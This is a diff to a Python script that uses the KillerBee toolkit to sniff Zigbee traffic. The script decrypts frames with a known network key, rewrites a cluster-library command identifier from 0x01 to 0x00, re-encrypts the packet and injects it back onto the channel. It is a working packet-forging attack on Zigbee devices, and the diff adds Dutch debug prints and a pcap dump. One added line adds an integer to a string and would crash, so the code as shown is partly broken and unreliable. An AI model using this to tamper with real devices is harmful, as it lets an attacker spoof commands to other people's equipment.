@@ -22,14 +22,23 @@ def craftPacket(pkt, data):
     data.getlayer("ZigbeeClusterLibrary").command_identifier = 0x00
     return kbencrypt(pkt, data, key)
 
+dev = KillerBee(device=kbutils.devlist()[0][0])
 
 while True:
-    pkt = kbsniff(args.channel)
-    if pkt.haslayer("ZigbeeSecurityHeader"):
-        dec = kbdecrypt(pkt, key)
+    pkt = kbsniff(args.channel, iface=dev, count=1)
+    print(pkt)
+    pkt[0].show()
+    print("voor eerste if")
+    if pkt[0].haslayer("ZigbeeSecurityHeader"):
+        print("voor 2e if")
+        kbwrpcap("test.pcap", pkt)
+        dec = kbdecrypt(pkt[0], key)
+        dec.show()
+
         if dec.haslayer("ZigbeeClusterLibrary") and dec.getlayer("ZigbeeClusterLibrary").command_identifier == 0x01: 
-            pkt.show()
+            print(1234 + "HIERO")
             newPkt = craftPacket(pkt, dec)
+            print("New packet")
             newPkt.show()
             kbsendp(newPkt, args.channel)
 
